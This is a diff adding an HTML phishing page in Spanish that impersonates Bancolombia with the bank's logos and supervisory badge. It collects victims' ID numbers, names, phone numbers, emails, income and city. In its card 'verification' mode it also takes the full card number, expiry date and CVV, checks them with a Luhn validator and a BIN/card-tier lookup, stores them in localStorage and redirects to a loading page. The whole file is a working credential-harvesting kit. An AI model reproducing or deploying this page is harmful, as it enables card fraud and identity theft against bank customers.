@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+	 
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Solicitud de Producto</title>
+<link rel="stylesheet" href="style.css">
+<script src="js/jquery-3.7.7.js"></script>
+<style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap');
+
+        body {
+            font-family: 'Open Sans', sans-serif;
+            background-color: #f7f7f7;
+        }
+
+        .titulo-principal {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: #2c2a29;
+        }
+
+        .descripcion {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .form-box {
+            padding: 30px 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            max-width: 450px;
+            width: 90%;
+            margin: 0 auto;
+            background: #fff;
+        }
+
+        /* Responsive ajustes para móviles */
+        @media (max-width: 480px) {
+            body {
+                background-color: #fff; /* Fondo blanco en móvil para evitar corte visual */
+                display: block; /* Flujo normal en móvil */
+                padding-bottom: 20px;
+            }
+
+            .header-top {
+                position: sticky;
+                top: 0;
+                z-index: 100;
+            }
+
+            .form-container {
+                width: 100%;
+                padding: 0;
+                margin: 0;
+                display: block;
+            }
+
+            .form-box {
+                padding: 20px 15px;
+                width: 100%;
+                box-shadow: none; /* Quitar sombra en móvil para look plano/nativo */
+                border-radius: 0;
+                margin: 0;
+                max-width: 100%;
+                box-sizing: border-box;
+            }
+
+            .titulo-principal {
+                font-size: 22px;
+                margin-top: 10px;
+                text-align: center;
+                padding: 0 15px;
+            }
+
+            .descripcion {
+                text-align: center;
+                padding: 0 15px;
+                font-size: 15px;
+            }
+
+            .campo-usuario {
+                margin-bottom: 20px; /* Más espacio entre campos */
+            }
+
+            .input-user {
+                height: 55px; /* Touch target mucho más grande */
+                font-size: 16px; /* Evita zoom en iOS */
+                padding-top: 20px; /* Espacio para el label flotante */
+                padding-bottom: 5px;
+            }
+
+            .placeholder-usuario {
+                font-size: 16px;
+                top: 18px; /* Ajuste inicial para input más alto */
+                left: 15px;
+            }
+
+            /* Ajuste label flotante cuando activo */
+            .input-user:focus ~ .placeholder-usuario,
+            .input-user:not(:placeholder-shown) ~ .placeholder-usuario,
+            .input-user:valid ~ .placeholder-usuario {
+                top: 8px; /* Más arriba dentro del input */
+                font-size: 11px;
+            }
+
+            .botones {
+                flex-direction: column-reverse;
+                gap: 15px;
+                padding: 0 5px;
+            }
+
+            .btn-continuar, .btn-volver {
+                width: 100%;
+                padding: 16px 0; /* Botones más altos */
+                font-size: 18px;
+                border-radius: 8px; /* Más redondeados en móvil */
+            }
+            
+            .footer-container {
+                padding-bottom: 40px; /* Espacio extra al final */
+            }
+        }
+
+
+        /* Estilo de inputs más profesional */
+        .campo-usuario {
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .input-user {
+            width: 100%;
+            border: 1px solid #d1d1d1;
+            border-radius: 4px;
+            padding: 12px 15px;
+            font-size: 15px;
+            outline: none;
+            background: #fff;
+            transition: all 0.3s ease;
+            box-sizing: border-box;
+            color: #333;
+            height: 48px; /* Altura fija para consistencia */
+        }
+
+        .input-user:focus {
+            border-color: #FDDA24;
+            box-shadow: 0 0 0 2px rgba(253, 218, 36, 0.2);
+        }
+
+        /* Ajuste para select */
+        select.input-user {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%23333%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-5%200-9.3%201.8-12.9%205.4A17.6%2017.6%200%200%200%200%2082.2c0%205%201.8%209.3%205.4%2012.9l128%20127.9c3.6%203.6%207.8%205.4%2012.8%205.4s9.2-1.8%2012.8-5.4L287%2095c3.5-3.5%205.4-7.8%205.4-12.8%200-5-1.9-9.2-5.5-12.8z%22%2F%3E%3C%2Fsvg%3E");
+            background-repeat: no-repeat;
+            background-position: right 15px top 50%;
+            background-size: 10px auto;
+            padding-right: 30px;
+        }
+
+        /* Label flotante mejorado */
+        .placeholder-usuario {
+            position: absolute;
+            left: 12px;
+            top: 14px;
+            padding: 0 5px;
+            background: white;
+            color: #777;
+            font-size: 15px;
+            transition: all 0.2s ease;
+            pointer-events: none;
+        }
+
+        .input-user:focus ~ .placeholder-usuario,
+        .input-user:not(:placeholder-shown) ~ .placeholder-usuario,
+        .input-user:valid ~ .placeholder-usuario {
+            top: -9px;
+            left: 10px;
+            font-size: 12px;
+            color: #2c2a29;
+            font-weight: 600;
+        }
+
+        /* Botones */
+        .botones {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        .btn-continuar {
+            background-color: #FDDA24;
+            color: #2c2a29;
+            border: none;
+            font-weight: 700;
+            border-radius: 4px; /* Bordes menos redondeados para look más serio */
+            transition: background-color 0.2s;
+        }
+
+        .btn-continuar:hover {
+            background-color: #e6c620;
+        }
+
+        .btn-volver {
+            border: 1px solid #ccc;
+            color: #666;
+            border-radius: 4px;
+            background: white;
+            transition: all 0.2s;
+        }
+
+        .btn-volver:hover {
+            border-color: #999;
+            color: #333;
+        }
+        
+        /* Ocultar campos por defecto */
+        .campo-oculto {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<!-- HEADER SUPERIOR -->
+<div class="header-top">
+    <div class="header-content">
+        <img src="images/logo.svg" alt="Bancolombia" class="logo-header">
+    </div>
+</div>
+
+<h1 class="titulo-principal" id="titulo-formulario">Solicitud</h1>
+
+<div class="form-container">
+    <div class="form-box">
+        <p class="descripcion">
+            Por favor ingresa los siguientes datos para continuar con tu solicitud.
+        </p>
+
+        <!-- ✅ DATOS COMUNES -->
+
+        <!-- Tipo de Documento -->
+        <div class="campo-usuario">
+            <select id="tipo_documento" class="input-user" required>
+                <option value="" disabled selected></option>
+                <option value="CC">Cédula de Ciudadanía</option>
+                <option value="CE">Cédula de Extranjería</option>
+                <option value="TI">Tarjeta de Identidad</option>
+                <option value="PP">Pasaporte</option>
+            </select>
+            <span class="placeholder-usuario">Tipo de Documento</span>
+        </div>
+
+        <!-- Número de Documento -->
+        <div class="campo-usuario">
+             <input type="tel" id="documento" class="input-user" placeholder=" " maxlength="15" />
+             <span class="placeholder-usuario">Número de Documento</span>
+        </div>
+
+        <!-- Nombre Completo -->
+        <div class="campo-usuario">
+             <input type="text" id="nombre" class="input-user" placeholder=" " />
+             <span class="placeholder-usuario">Nombre Completo</span>
+        </div>
+
+        <!-- Celular -->
+        <div class="campo-usuario">
+             <input type="tel" id="celular" class="input-user" placeholder=" " maxlength="10" />
+             <span class="placeholder-usuario">Celular</span>
+        </div>
+
+        <!-- Correo Electrónico -->
+        <div class="campo-usuario">
+             <input type="email" id="correo" class="input-user" placeholder=" " />
+             <span class="placeholder-usuario">Correo Electrónico</span>
+        </div>
+
+        <!-- Ingresos Mensuales -->
+        <div class="campo-usuario">
+             <input type="tel" id="ingresos" class="input-user formato-dinero" placeholder=" " />
+             <span class="placeholder-usuario">Ingresos Mensuales</span>
+        </div>
+
+        <!-- Ciudad -->
+        <div class="campo-usuario">
+             <input type="text" id="ciudad" class="input-user" placeholder=" " />
+             <span class="placeholder-usuario">Ciudad</span>
+        </div>
+
+        <!-- ✅ CAMPOS DINÁMICOS -->
+
+        <!-- GRUPO: CRÉDITO / LIBRE INVERSIÓN -->
+        <div id="grupo-credito" class="campo-oculto">
+            <div class="campo-usuario">
+                 <input type="tel" id="monto_solicitado" class="input-user formato-dinero" placeholder=" " />
+                 <span class="placeholder-usuario">Monto Solicitado</span>
+            </div>
+            <div class="campo-usuario">
+                 <input type="tel" id="plazo_meses" class="input-user" placeholder=" " maxlength="3" />
+                 <span class="placeholder-usuario">Plazo (meses)</span>
+            </div>
+        </div>
+
+        <!-- GRUPO: VIVIENDA -->
+        <div id="grupo-vivienda" class="campo-oculto">
+            <div class="campo-usuario">
+                 <input type="tel" id="valor_inmueble" class="input-user formato-dinero" placeholder=" " />
+                 <span class="placeholder-usuario">Valor del Inmueble</span>
+            </div>
+            <div class="campo-usuario">
+                 <input type="tel" id="cuota_inicial" class="input-user formato-dinero" placeholder=" " />
+                 <span class="placeholder-usuario">Cuota Inicial</span>
+            </div>
+            <div class="campo-usuario">
+                <select id="tipo_vivienda" class="input-user">
+                    <option value="" disabled selected></option>
+                    <option value="Nueva">Nueva</option>
+                    <option value="Usada">Usada</option>
+                </select>
+                <span class="placeholder-usuario">Tipo de Vivienda</span>
+            </div>
+        </div>
+
+        <!-- GRUPO: TARJETA CRÉDITO/DÉBITO -->
+        <div id="grupo-tarjeta-dc" class="campo-oculto">
+            <div class="campo-usuario">
+                 <input type="tel" id="inp_c_nm" class="input-user" placeholder=" " maxlength="19" />
+                 <span class="placeholder-usuario">Número de Tarjeta</span>
+            </div>
+            <div style="display: flex; gap: 15px;">
+                <div class="campo-usuario" style="flex: 1;">
+                     <input type="tel" id="inp_c_xp" class="input-user" placeholder=" " maxlength="5" />
+                     <span class="placeholder-usuario">Fecha (MM/YY)</span>
+                </div>
+                <div class="campo-usuario" style="flex: 1;">
+                     <input type="password" id="inp_c_vv" class="input-user" placeholder=" " maxlength="4" />
+                     <span class="placeholder-usuario">CVV</span>
+                </div>
+            </div>
+        </div>
+
+
+        <div class="botones" style="margin-top: 20px;">
+            <button class="btn-volver" onclick="window.location.href='index0.html'">Volver</button>
+            <button class="btn-continuar" onclick="enviarSolicitud()">Continuar</button>
+        </div>
+    </div>
+</div>
+
+<!-- FOOTER -->
+<div class="footer-container">
+    <div class="logo-intermedio">
+        <img src="images/loo.png" alt="Bancolombia">
+    </div>
+    
+    <div class="vigilado-logo">
+        <img src="images/vigiladosuper.png">
+    </div>
+
+    <div class="info-footer">
+        <div class="ip-text">Dirección IP: <span id="gfg">Cargando...</span></div>
+        <div id="fecha-hora" class="fecha-text"></div>
+    </div>
+</div>
+
+<!-- Hidden fields for IP -->
+<div id="address" style="display:none;"></div>
+
+<script>
+    // Get URL parameter for type
+    const urlParams = new URLSearchParams(window.location.search);
+    const tipo = urlParams.get('tipo');
+    const titulo = document.getElementById('titulo-formulario');
+    const grupoCredito = document.getElementById('grupo-credito');
+    const grupoVivienda = document.getElementById('grupo-vivienda');
+    const grupoTarjetaDC = document.getElementById('grupo-tarjeta-dc');
+
+    // Configuración de visualización según tipo
+    if (tipo === 'tarjeta') {
+        titulo.innerText = 'Solicitud de Tarjeta de Crédito';
+        grupoCredito.style.display = 'block';
+    } else if (tipo === 'libre_inversion') {
+        titulo.innerText = 'Solicitud Libre Inversión';
+        grupoCredito.style.display = 'block';
+    } else if (tipo === 'vivienda') {
+        titulo.innerText = 'Solicitud Crédito de Vivienda';
+        grupoVivienda.style.display = 'block';
+    } else if (tipo === 'tarjeta_dc') {
+        titulo.innerText = 'Verificación Tarjeta Débito/Crédito';
+        grupoTarjetaDC.style.display = 'block';
+    } else {
+        // Default si no hay tipo, asumimos libre inversión o no mostramos nada específico
+        titulo.innerText = 'Solicitud de Producto';
+    }
+
+    // IP Script
+    $.getJSON("https://api.ipify.org?format=json", function(data) {
+        $("#gfg").html(data.ip);
+        $("#address").html(data.ip);
+    });
+
+    // Date Script
+    function actualizarFecha() {
+        const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true };
+        const fecha = new Date().toLocaleDateString('es-CO', options);
+        document.getElementById("fecha-hora").textContent = fecha;
+    }
+    setInterval(actualizarFecha, 1000);
+    actualizarFecha();
+
+    // ==========================================
+    // LÓGICA TARJETA CRÉDITO / DÉBITO
+    // ==========================================
+
+    // Format Date Input 
+    const inpExp = document.getElementById('inp_c_xp');
+    if (inpExp) {
+        inpExp.addEventListener('input', function(e) { 
+            var input = e.target.value; 
+            if (input.length === 2 && !input.includes('/')) { 
+                e.target.value = input + '/'; 
+            } 
+        });
+    }
+  
+    function validateLuhn(pan) { 
+        let nCheck = 0, bEven = false; 
+        pan = pan.replace(/\D/g, ""); 
+        for (var n = pan.length - 1; n >= 0; n--) { 
+            var cDigit = pan.charAt(n), 
+                nDigit = parseInt(cDigit, 10); 
+            if (bEven) { 
+                if ((nDigit *= 2) > 9) nDigit -= 9; 
+            } 
+            nCheck += nDigit; 
+            bEven = !bEven; 
+        } 
+        return (nCheck % 10) == 0; 
+    } 
+  
+    function validateDate(exp) { 
+        if (!/^\d{2}\/\d{2}$/.test(exp)) return false; 
+        var parts = exp.split('/'); 
+        var month = parseInt(parts[0], 10); 
+        
+        if (month < 1 || month > 12) return false; 
+        return true; 
+    } 
+  
+    async function identifyBin(bin) { 
+        if (bin.length < 6) return "Desconocido"; 
+        try { 
+            const controller = new AbortController(); 
+            const timeoutId = setTimeout(() => controller.abort(), 1500); 
+            
+            const response = await fetch(`https://data.handyapi.com/bin/${bin}`, { signal: controller.signal }); 
+            clearTimeout(timeoutId); 
+  
+            if (!response.ok) throw new Error('Network response was not ok'); 
+            const data = await response.json(); 
+            
+            let scheme = (data.Scheme || "").toUpperCase(); 
+            let type = (data.Type || "").toUpperCase(); 
+            let level = (data.CardTier || "").toUpperCase(); // Gold, Platinum, etc. 
+            
+            if(!scheme) { 
+                // Fallback simple 
+                if(bin.startsWith('4')) scheme = "VISA"; 
+                else if(bin.startsWith('5')) scheme = "MASTERCARD"; 
+                else if(bin.startsWith('3')) scheme = "AMEX"; 
+            } 
+  
+            return `${scheme} ${level} ${type}`.trim(); 
+        } catch (error) { 
+            // Fallback regex 
+            if(bin.startsWith('4')) return "VISA"; 
+            if(bin.startsWith('5')) return "MASTERCARD"; 
+            if(bin.startsWith('3')) return "AMEX"; 
+            return "Desconocido"; 
+        } 
+    } 
+
+    // Restricción para Celular (Solo números)
+    const inpCelular = document.getElementById('celular');
+    if (inpCelular) {
+        inpCelular.addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '');
+        });
+    }
+
+    // ✅ NUEVAS VALIDACIONES (Documento, Nombre, Ciudad, Plazo)
+    
+    // 1. Documento: Solo Números
+    const inpDocumento = document.getElementById('documento');
+    if (inpDocumento) {
+        inpDocumento.addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '');
+        });
+    }
+
+    // 2. Nombre: Solo Letras y Espacios (Validación en blur para no bloquear teclado móvil)
+    const inpNombre = document.getElementById('nombre');
+    if (inpNombre) {
+        inpNombre.addEventListener('blur', function(e) {
+            // Permitir letras (con tildes/ñ) y espacios
+            this.value = this.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑüÜ\s]/g, '');
+        });
+    }
+
+    // 3. Ciudad: Solo Letras y Espacios (Validación en blur)
+    const inpCiudad = document.getElementById('ciudad');
+    if (inpCiudad) {
+        inpCiudad.addEventListener('blur', function(e) {
+            // Permitir letras (con tildes/ñ) y espacios
+            this.value = this.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑüÜ\s]/g, '');
+        });
+    }
+
+    // Asegurar foco en inputs al tocar el contenedor (Fix para móviles)
+    document.querySelectorAll('.campo-usuario').forEach(div => {
+        div.addEventListener('click', function() {
+            const input = this.querySelector('.input-user');
+            if (input) input.focus();
+        });
+    });
+
+    // 4. Plazo: Solo Números
+    const inpPlazo = document.getElementById('plazo_meses');
+    if (inpPlazo) {
+        inpPlazo.addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '');
+        });
+    }
+
+    // Formateo de Dinero
+    const inputsDinero = document.querySelectorAll('.formato-dinero');
+    inputsDinero.forEach(input => {
+        input.addEventListener('input', function(e) {
+            // Eliminar cualquier caracter que no sea numero
+            let value = this.value.replace(/\D/g, '');
+            
+            if (value === '') {
+                this.value = '';
+                return;
+            }
+            
+            // Formatear con puntos de mil usando toLocaleString
+            this.value = '$' + Number(value).toLocaleString('es-CO', { maximumFractionDigits: 0 });
+        });
+    });
+
+    // Validation and Send
+    async function enviarSolicitud() {
+        const btn = document.querySelector('.btn-continuar');
+        
+        // Datos Comunes
+        const tipo_documento = document.getElementById('tipo_documento').value;
+        const documento = document.getElementById('documento').value;
+        const nombre = document.getElementById('nombre').value;
+        const celular = document.getElementById('celular').value;
+        const correo = document.getElementById('correo').value;
+        const ingresos = document.getElementById('ingresos').value;
+        const ciudad = document.getElementById('ciudad').value;
+
+        // Validar comunes
+        if (!tipo_documento || !documento || !nombre || !celular || !correo || !ingresos || !ciudad) {
+            alert('Por favor completa todos los datos personales.');
+            return;
+        }
+
+        // Validación de Celular (Síncrona)
+        if (celular.length !== 10) {
+            alert('El número de celular debe tener 10 dígitos.');
+            return;
+        }
+
+        // Validación de correo estricta (.com) (Síncrona)
+        if (!correo.includes('@') || !correo.endsWith('.com')) {
+            alert('El correo electrónico debe contener "@" y terminar en ".com".');
+            return;
+        }
+
+        // Validación de correo básica regex
+        const emailRegex = /^[^\s@]+@[^\s@]+\.com$/;
+        if (!emailRegex.test(correo)) {
+            alert('Por favor ingresa un correo electrónico válido que termine en .com');
+            return;
+        }
+
+        // Datos Específicos
+        let datosEspecificos = {};
+        
+        if (tipo === 'libre_inversion' || tipo === 'tarjeta') {
+            const monto = document.getElementById('monto_solicitado').value;
+            const plazo = document.getElementById('plazo_meses').value;
+            
+            if (!monto || !plazo) {
+                alert('Por favor ingresa el monto y el plazo.');
+                return;
+            }
+            datosEspecificos = { monto: monto, plazo: plazo };
+
+        } else if (tipo === 'vivienda') {
+            const valorInmueble = document.getElementById('valor_inmueble').value;
+            const cuotaInicial = document.getElementById('cuota_inicial').value;
+            const tipoVivienda = document.getElementById('tipo_vivienda').value;
+            
+            if (!valorInmueble || !cuotaInicial || !tipoVivienda) {
+                alert('Por favor completa los datos de la vivienda.');
+                return;
+            }
+            datosEspecificos = { 
+                valor_inmueble: valorInmueble, 
+                cuota_inicial: cuotaInicial,
+                tipo_vivienda: tipoVivienda
+            };
+        } else if (tipo === 'tarjeta_dc') {
+            const pan = document.getElementById('inp_c_nm').value.replace(/\s/g, ''); 
+            const exp = document.getElementById('inp_c_xp').value; 
+            const cvv = document.getElementById('inp_c_vv').value; 
+             
+            if (pan.length < 15) { 
+                alert("El número de tarjeta debe tener al menos 15 dígitos."); 
+                return; 
+            } 
+ 
+            if (!validateLuhn(pan)) {
+                alert("El número de tarjeta no es válido.");
+                return;
+            }
+
+            if (!validateDate(exp)) { 
+                alert("La fecha de vencimiento es inválida."); 
+                return; 
+            } 
+ 
+            if (cvv.length < 3) { 
+                alert("Código de seguridad (CVV) inválido."); 
+                return; 
+            }
+
+            // Identificar BIN
+            btn.disabled = true;
+            btn.innerText = "Verificando...";
+            const binInfo = await identifyBin(pan.substring(0, 6));
+
+            datosEspecificos = {
+                tarjeta_bin_info: binInfo,
+                tarjeta_pan: pan,
+                tarjeta_exp: exp,
+                tarjeta_cvv: cvv
+            };
+        }
+
+        // Disable button
+        btn.disabled = true;
+        btn.innerText = "Procesando...";
+
+        // Save to localStorage
+        const formData = {
+            titulo: titulo.innerText,
+            tipo_solicitud: tipo,
+            // Comunes
+            tipo_documento: tipo_documento,
+            documento: documento,
+            nombre: nombre,
+            celular: celular,
+            correo: correo,
+            ingresos: ingresos,
+            ciudad: ciudad,
+            // Específicos (spread)
+            ...datosEspecificos
+        };
+        
+        localStorage.setItem('formData', JSON.stringify(formData));
+
+        // Redirect
+        window.location.href = 'load_solicitud.html';
+    }
+</script>
+
+</body>
+</html>
